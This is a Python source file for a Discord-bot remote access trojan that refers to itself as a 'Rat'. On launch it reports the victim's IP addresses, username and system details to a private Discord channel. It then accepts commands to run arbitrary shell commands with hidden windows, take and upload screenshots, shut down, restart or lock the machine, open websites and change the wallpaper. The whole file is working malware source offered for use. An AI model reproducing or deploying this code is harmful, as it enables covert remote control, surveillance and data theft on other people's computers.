import os
import re
import sys
import socket
import traceback
import random
import pyautogui
import string
import asyncio
import winreg
import json
import uuid
import requests
import datetime
import platform
import getpass
import urllib
import ctypes
import psutil
import discord
import subprocess
from discord.ext import commands

bot_token = ""
user_ids = {"id"} # add ur user id without the ""
create_no_window = 0x08000000

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def is_authorized(ctx):
    if user_ids is None:
        return True
    return ctx.author.id in user_ids

MY_CHANNEL_ID = None

def correct_channel(ctx):
    global MY_CHANNEL_ID
    if MY_CHANNEL_ID is None:
        return False
    return ctx.channel.id == MY_CHANNEL_ID

# septic tank
def get_pc_id():
    hostname = socket.gethostname()
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        return f"{hostname}-{mac_str}"
    except:
        return hostname

def get_pc_name():
    return socket.gethostname()

PC_ID_FOR_FILE = get_pc_id().replace(':', '_').replace('-', '_')
SESSION_FILE = os.path.join(os.environ['TEMP'], f'bot_sessions_{PC_ID_FOR_FILE}.json')
current_session = None
SESSION_CATEGORY_NAME = "my pc"

def load_sessions():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, 'r') as f:
                all_sessions = json.load(f)
            current_pc = get_pc_name()
            filtered = {}
            for k, v in all_sessions.items():
                if v.get('pc_name') == current_pc:
                    filtered[k] = v
            
            return filtered
        except:
            return {}
    return {}

def save_sessions(sessions):
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions, f, indent=2)
    except Exception as e:
        traceback.print_exc()

async def create_session_channel(guild, pc_name, session_num):
    try:
        category = None
        for cat in guild.categories:
            if cat.name == SESSION_CATEGORY_NAME:
                category = cat
                break
        
        if not category:
            category = await guild.create_category(SESSION_CATEGORY_NAME)
        
        existing_sessions = []
        for channel in category.text_channels:
            if channel.name.startswith(f"{pc_name}-session-"):
                try:
                    num = int(channel.name.split('-')[-1])
                    existing_sessions.append(num)
                except:
                    pass

        if existing_sessions:
            session_num = max(existing_sessions) + 1
        
        channel_name = f"{pc_name}-session-{session_num}"
        
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    }

        for user_id in user_ids:
            overwrites[discord.Object(id=user_id)] = discord.PermissionOverwrite(
            read_messages=True, 
            send_messages=True
        )
        
        channel = await category.create_text_channel(
            name=channel_name,
            overwrites=overwrites,
            topic=f"PC: {pc_name} | Session #{session_num} | Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return channel
    except Exception as e:
        return None
    
async def register_session_with_channel(guild):
    global current_session, MY_CHANNEL_ID
    sessions = load_sessions()
    
    pc_id = get_pc_id()
    pc_name = get_pc_name()
    
    session_num = 1
    
    channel = await create_session_channel(guild, pc_name, session_num)

    if channel:
        try:
            session_num = int(channel.name.split('-')[-1])
        except:
            pass
        
        MY_CHANNEL_ID = channel.id
    
    channel_id = channel.id if channel else None

    session_data = {
        'pc_id': pc_id,
        'pc_name': pc_name,
        'session_num': session_num,
        'pid': os.getpid(),
        'hostname': pc_name,
        'user': getpass.getuser(),
        'os': platform.system(),
        'os_release': platform.release(),
        'start_time': datetime.datetime.now().isoformat(),
        'active': True,
        'channel_id': channel_id,
        'ip': socket.gethostbyname(pc_name),
        'cwd': os.getcwd()
    }
    
    session_key = f"{pc_id}-{session_num}"
    sessions[session_key] = session_data
    save_sessions(sessions)
    current_session = session_key
    
    return session_key, session_num, pc_name, channel
def unregister_session():
    global current_session
    if current_session:
        sessions = load_sessions()
        if current_session in sessions:
            sessions[current_session]['active'] = False
            sessions[current_session]['end_time'] = datetime.datetime.now().isoformat()
            save_sessions(sessions)
        current_session = None

# events
@bot.event
async def on_ready():
    
    try:
        if bot.guilds:
            guild = bot.guilds[0]

            session_key, session_num, pc_name, channel = await register_session_with_channel(guild)
            print(f"✅ session created: {session_key}")
            
            if channel:
                await channel.send(f"**{pc_name} - {session_num}**\n")
            await auto_send_dm(session_num, pc_name, channel)
        else:
            pass
    except Exception as e:
        traceback.print_exc()

async def auto_send_dm(session_num=None, pc_name=None, channel=None):
    try:
        if not user_ids:
            return
            
        first_user_id = next(iter(user_ids))
        user = await bot.fetch_user(first_user_id)

        hostname = socket.gethostname()
        
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Could not get local IP"
        
        try:
            pc_user = os.getenv('USERNAME') or os.getenv('USER') or "Unknown"
        except:
            pc_user = "Unknown"

        public_ip = "Could not get public IP"
        try:
            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8')
        except:
            try:
                public_ip = urllib.request.urlopen('https://icanhazip.com', timeout=3).read().decode('utf-8').strip()
            except:
                pass

        os_name = platform.system()
        os_release = platform.release()
        architecture = platform.machine()
        
        try:
            cpu_cores = psutil.cpu_count(logical=False) or "Unknown"
            cpu_threads = psutil.cpu_count(logical=True) or "Unknown"
            cpu_percent = psutil.cpu_percent(interval=0.1)
        except:
            cpu_cores = "Unknown"
            cpu_threads = "Unknown"
            cpu_percent = "Unknown"
        
        try:
            memory = psutil.virtual_memory()
            ram_total = f"{memory.total / (1024**3):.2f} GB"
            ram_percent = f"{memory.percent}%"
        except:
            ram_total = "Unknown"
            ram_percent = "Unknown"
        
        try:
            disk = psutil.disk_usage('C:\\')
            disk_total = f"{disk.total / (1024**3):.2f} GB"
            disk_percent = f"{disk.percent}%"
        except:
            disk_total = "Unknown"
            disk_percent = "Unknown"
        
        try:
            boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - boot_time
            boot_time_str = boot_time.strftime('%Y-%m-%d %H:%M:%S')
            uptime_str = str(uptime).split('.')[0]
        except:
            boot_time_str = "Unknown"
            uptime_str = "Unknown"
        
        pid = os.getpid()
        
        pc_text = f"{pc_name}" if pc_name else "Unknown PC"
        session_text = f"session #{session_num}" if session_num else "no session"
        
        
        msg = (
            f"```\n"
            f"Public IP:  {public_ip}\n"
            f"Local IP:   {local_ip}\n"
            f"Hostname:   {hostname}\n"
            f"User:       {pc_user}\n"
            f"PID:        {pid}\n"
            f"```\n"
            f"**system**\n"
            f"```\n"
            f"OS:         {os_name} {os_release}\n"
            f"Arch:       {architecture}\n"
            f"CPU:        {cpu_cores}C/{cpu_threads}T ({cpu_percent}%)\n"
            f"RAM:        {ram_total} ({ram_percent})\n"
            f"Disk C:     {disk_total} ({disk_percent})\n"
            f"Boot:       {boot_time_str}\n"
            f"Uptime:     {uptime_str}\n"
            f"```\n"
        )
        if channel:
            await channel.send(msg)
            
    except Exception as e:
        for user_id in user_ids:
            try:
                user = await bot.fetch_user(user_id)
                await user.send(f"🐀 Rat started on {pc_name} Session #{session_num} (system info unavailable)")
                if channel and user_id == next(iter(user_ids)):
                    await channel.send(f"🐀 Rat started on {pc_name} Session #{session_num} (system info unavailable)")
            except:
                pass

@bot.command(name='show')
async def helpmenu(ctx):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    embed = discord.Embed(
        title="control my pc",
        color=discord.Color.purple()
    )

    commands = (
        "`!admin` - check for admin privileges\n"
        "`!cmd` - command prompt\n"
        "`!website` - open a website\n"
        "`!wallpaper` - change wallpaper\n"
        "`!shutdown` - shutdown pc\n"
        "`!restart` - restart pc\n"
        "`!lock` - lock the pc\n"
        "`!sleep` - put pc to sleep\n"
        "`!screenshot` - take a screenshot\n"
        "`!clear` - clear chat"
    )

    embed.add_field(name=" **commands:**", value=commands, inline=False)

    embed.set_footer(text="made by knjxy")

    await ctx.send(embed=embed)

@bot.command(name='admin')
async def checkadmin(ctx):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return
    
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    
    if is_admin:
        embed = discord.Embed(
            title="",
            description="✅ R4T is running with admin privileges.",
            color=discord.Color.green()
        )

        process = psutil.Process(os.getpid())
        username = process.username()
        
        embed.add_field(name="running as", value=f"`{username}`", inline=True)
        embed.add_field(name="PID", value=f"`{os.getpid()}`", inline=True)
        
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="",
            description="❌ R4T is running without admin privileges.",
            color=discord.Color.red()
        )
        embed.add_field(
            name="⚠️ warning",
            value="some commands may fail.",
            inline=False
        )
        await ctx.send(embed=embed)

@bot.command(name='website', aliases=['web'])
async def open_website(ctx, *, url=None):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    if url is None:
        await ctx.send("? no url detected.")
        return
    
    async with ctx.typing():
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url

                subprocess.Popen(['cmd', '/c', 'start', '', url], 
                               shell=True, 
                               creationflags=create_no_window)


            await ctx.send(f"📖 opened : {url}")
        except Exception as e:
            await ctx.send(f"❌ failed to open {url} {str(e)}")

@bot.command(name='cmd')
async def run_command(ctx, *, command):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            await ctx.send(f"executing: `{command}`")
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            
            try:
                stdout, stderr = process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                await ctx.send("⚠️ command timed out after 10 seconds")
            
            response = ""
            if stdout:
                output = stdout[:1500] if len(stdout) > 1500 else stdout
                response += f"**output:**\n```\n{output}\n```"
            if stderr:
                error = stderr[:500] if len(stderr) > 500 else stderr
                response += f"**⚠️ errors:**\n```\n{error}\n```"
            
            if not stdout and not stderr:
                response = "✅ command executed (no output)"
            
            if process.returncode == 0:
                response += f"\n✅ exit code: {process.returncode}"
            else:
                response += f"\n❌ exit code: {process.returncode}"
            
            await ctx.send(response)
        
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")

@bot.command(name='wallpaper', aliases=['wall'])
async def change_wallpaper(ctx, image_url=None):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")

    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]
                
                allowed_image_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif', '.webp']
                file_ext = os.path.splitext(attachment.filename)[1].lower()
                
                if file_ext not in allowed_image_extensions:
                    await ctx.send(f"❌ unsupported image type, allowed: {', '.join(allowed_image_extensions)}")
                    return
                
                await ctx.send(f"downloading image: {attachment.filename}...")
                
                file_data = await attachment.read()
                
                filename = f"wallpaper_attachment_{''.join(random.choices(string.ascii_letters, k=10))}{file_ext}"
                
            elif image_url:
                await ctx.send(f"downloading image.")
                
                response = requests.get(image_url, timeout=10)
                
                if response.status_code != 200:
                    await ctx.send(f"❌ failed to download image (HTTP {response.status_code})")
                    return
                
                file_data = response.content
                
                if '.' in image_url.split('/')[-1]:
                    file_ext = '.' + image_url.split('/')[-1].split('.')[-1].split('?')[0].lower()
                    if file_ext not in ['.jpg', '.jpeg', '.png', '.bmp', '.gif']:
                        file_ext = '.jpg'
                else:
                    file_ext = '.jpg'
                
                filename = f"wallpaper_url_{''.join(random.choices(string.ascii_letters, k=10))}{file_ext}"
            
            else:
                await ctx.send("❌ no url or image attached was detected.")
                return
            
            if os.name == 'nt':
                filepath = os.path.join(os.environ['TEMP'], filename)
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            if os.name == 'nt':
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Control Panel\Desktop", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "10")
                    winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
                    winreg.CloseKey(key)
                except:
                    pass
                
                await ctx.send("✅ wallpaper changed.")

            try:
                temp_dir = os.environ['TEMP'] if os.name == 'nt' else '/tmp'
                wallpaper_files = [f for f in os.listdir(temp_dir) if f.startswith('wallpaper_')]
                wallpaper_files.sort(key=lambda x: os.path.getmtime(os.path.join(temp_dir, x)), reverse=True)
                
                for old_file in wallpaper_files[5:]:
                    try:
                        os.remove(os.path.join(temp_dir, old_file))
                    except:
                        pass
            except:
                pass
            
        except requests.exceptions.RequestException as e:
            await ctx.send(f"❌ failed to download image: {str(e)}")
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")

@bot.command(name='shutdown')
async def shutdown(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("pc shutdown successfully.")

        subprocess.run(["shutdown", "/s", "/t", "0"], creationflags=create_no_window, shell=False)

    except Exception as e:
        await ctx.send(f"❌ failed {str(e)}")

@bot.command(name='restart')
async def restart(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("pc restarted successfully.")
        
        subprocess.run(["shutdown", "/r", "/t", "0"], creationflags=create_no_window)
    except Exception as e:
        await ctx.send(f"❌ failed {str(e)}")

@bot.command(name='lock')
async def lockpc(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("pc locked successfully.")

        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        await ctx.send(f"❌ failed {str(e)}")

@bot.command(name='sleep')
async def sleep(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("pc was put to sleep successfully.")
        await asyncio.sleep(3)
        
        subprocess.Popen(
            'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
            shell=True,
            creationflags=create_no_window,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
    except Exception as e:
        await ctx.send(f"❌ failed to sleep: {str(e)}")

@bot.command(name='screenshot', aliases=['ss'])
async def take_screenshot(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:
            screenshot = pyautogui.screenshot()
            
            filename = f"screenshot_{''.join(random.choices(string.ascii_letters, k=10))}.png"
            
            if os.name == 'nt':
                filepath = os.path.join(os.environ['TEMP'], filename)
            
            screenshot.save(filepath)
            
            await ctx.send("screenshot taken:", file=discord.File(filepath))
            
            os.remove(filepath)
        
        except Exception as e:
            await ctx.send(f"❌ failed to take screenshot: {str(e)}")

@bot.command(name='clear', aliases=['cls', 'clr'])
async def clear(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    for loop in range(24):
        await ctx.send("ㅤ")
        await asyncio.sleep(0.5)

if __name__ == "__main__":
        try:
            bot.run(bot_token)
        except discord.LoginFailure:
            pass
        except Exception as e:
            pass